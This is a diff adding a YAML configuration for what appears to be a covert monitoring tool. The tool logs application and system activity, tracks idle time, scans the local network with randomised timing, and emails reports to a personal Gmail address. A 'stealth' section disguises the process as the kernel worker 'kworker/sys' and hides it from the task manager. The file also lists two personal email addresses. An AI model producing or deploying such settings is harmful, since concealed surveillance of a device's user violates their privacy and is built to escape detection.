@@ -1,0 +1,29 @@
+general:
+  report_time: "23:00"
+  timezone: "Asia/Riyadh"
+  data_retention_days: 30
+  log_level: "INFO"
+
+monitoring:
+  app_sample_interval: 10    # Real-time: locked at 10s
+  system_sample_interval: 60
+  idle_threshold: 300
+
+network:
+  scan_interval: 180
+  scan_jitter: 60
+  scan_timeout: 3
+  subnet: "auto"
+  interface: "auto"
+
+email:
+  enabled: true
+  recipient: "khalid.alansari3769@gmail.com"
+  sender: "khalidklod.an.2566@gmail.com"
+  smtp_server: "smtp.gmail.com"
+  smtp_port: 587
+  use_tls: true
+
+stealth:
+  process_name: "kworker/sys"
+  hide_from_taskmanager: true
